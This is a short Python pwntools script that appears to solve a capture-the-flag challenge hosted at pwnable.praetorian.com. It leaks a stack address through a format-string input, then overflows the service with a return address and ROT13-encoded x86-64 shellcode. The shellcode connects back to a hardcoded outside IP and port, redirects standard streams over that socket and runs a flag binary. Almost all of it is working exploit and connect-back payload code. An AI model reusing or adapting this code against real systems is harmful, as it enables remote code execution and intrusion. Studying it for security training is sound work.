# t0 - 2025
from pwn import *
import codecs
context.timeout = 30

def rot13_encode(shellcode):
    shellcode_array = bytearray(shellcode)
    i = 0
    for byte in shellcode:
        if (65 <= byte <= 90) or (97 <= byte <= 122):
            shellcode_array[i] = ord(codecs.encode(chr(byte),'rot_13'))
        i=i+1
    shellcode = bytes(shellcode_array)
    return shellcode
#io = remote("127.0.0.1", 2888)
io = remote('pwnable.praetorian.com',2888)
banner = io.recvuntil(b"3 tokens remaining.\n")
io.sendline(b'0x%llx')
addr = io.recvline().strip().decode()
log.info("leaked shellcode address using format string: {}".format(str(addr)))

iAddr = int(addr, 16)+544
sAddr = str(hex(iAddr))
log.info("address + 544 = {}".format(sAddr))
ret = rot13_encode(p64(int(sAddr,16)))
padding = b"\x90"*450

log.info("building shellcode...")
context.arch = 'amd64'
assembly = """
   push 0x29
   pop rax
   push 0x2 
   pop rdi
   push 0x1 
   pop rsi
   cdq 
   syscall

   xchg rdi, rax
   xor eax, eax
   add eax, 0xcc462633
   mov [rsp-4], eax
   xor ax, ax
   add ax, 0x5c11
   mov [rsp-6], ax
   xor al, al
   add al, 0x02
   mov [rsp-8], al
   sub rsp, 8

   push 0x2a 
   pop rax
   mov rsi, rsp   
   push 0x10 
   pop rdx
   syscall

   push 0x3
   pop rsi

dup2_loop:
   dec rsi
   push 0x21
   pop rax
   syscall
   jnz dup2_loop 

	xor rax, rax
	xor rdx, rdx
	
	push rax
	push rax
	mov r10, 0x6d6f632e6c69616d
	push r10
	mov r10, 0x6740696969782e64
	push r10
	mov r10, 0x7261707065687362
	push r10
	mov r10, rsp

	push rax
	push 0x67
	mov rdi, 0x616c662f6e69622f
	push rdi
	mov rdi, rsp

 	push rdx
	push r8
	push rcx
	push r9
	push r10
        push rdi
	mov rsi, rsp
	xor rdx, rdx
	add rax, 59
	syscall
"""
shellcode = asm(assembly)
log.info("rot13 encoding shellcode")
shellcode = rot13_encode(shellcode)
pre_code = b"A"*24;
log.info("sending payload....")
io.sendline(pre_code+ret+shellcode+padding)
log.info("done.")
